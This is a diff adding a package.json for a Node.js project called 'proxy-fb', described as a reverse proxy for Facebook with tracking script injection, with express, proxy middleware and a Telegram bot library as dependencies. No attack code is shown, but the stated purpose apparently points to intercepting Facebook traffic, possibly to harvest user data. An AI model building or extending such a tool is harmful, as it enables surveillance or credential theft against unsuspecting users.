@@ -1,0 +1,18 @@
+{
+  "name": "proxy-fb",
+  "version": "1.0.0",
+  "description": "Reverse Proxy for Facebook with tracking script injection",
+  "main": "main.js",
+  "scripts": {
+    "start": "node main.js"
+  },
+  "dependencies": {
+    "dotenv": "^17.4.2",
+    "express": "^4.18.2",
+    "http-proxy-middleware": "^2.0.6",
+    "node-telegram-bot-api": "^0.67.0"
+  },
+  "devDependencies": {
+    "nodemon": "^3.0.0"
+  }
+}
